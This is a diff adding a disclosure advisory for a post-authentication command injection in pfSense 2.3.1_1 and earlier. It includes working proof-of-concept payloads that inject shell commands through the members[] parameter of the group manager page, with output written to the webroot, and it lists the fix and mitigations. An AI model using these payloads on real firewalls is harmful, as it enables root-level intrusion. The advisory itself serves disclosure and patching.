@@ -1,0 +1,27 @@
+# Exploit Title: pfSense <= 2.3.1_1 Post-Auth Command Execution
+# Date: 11-06-2017
+# Exploit Author: s4squatch (Scott White - www.trustedsec.com)
+# Vendor Homepage: https://www.pfsense.org
+# Version: 2.3-RELEASE
+# Vendor Security Advisory:  https://www.pfsense.org/security/advisories/pfSense-SA-16_08.webgui.asc
+
+1. Description
+pfSense <= 2.3.1_1 is affected by a post-authetication os command injection vulnerability in auth.inc via the /system_groupmanager.php page (System menu-->User Manager-->Groups) in the handling of the members[] parameter.  This allows an authenticated WebGUI user with
+privileges for system_groupmanager.php to execute commands in the context of the root user.
+
+2. Proof of Concept
+'`ifconfig>/usr/local/www/ifconfig.txt`'
+'`whoami>/usr/local/www/whoami.txt`'
+
+Command output can then be viewed at the webroot:
+http://<address>/ifconfig.txt
+http://<address>/whoami.txt
+
+Another POC:  0';/sbin/ping -c 10 192.168.1.125;'
+
+3.  Solution
+Upgrade to the latest version of pfSense (2.3.1_5 on is fixed). This may be performed in the web interface or from
+the console.  See https://doc.pfsense.org/index.php/Upgrade_Guide  Furthermore, the issues can be mitigated by restricting access to the firewall GUI both with firewall rules and by not allowing untrusted users to have accounts with GUI access, and by not granting untrusted administrators access to the pages in question.
+
+Issue was responsibly disclosed to pfSense (security@pfsense.org) on 06/08/2016 and fixed 06/09/2016!
+Thank you to Jim P and the pfSense team for the impressive response time.
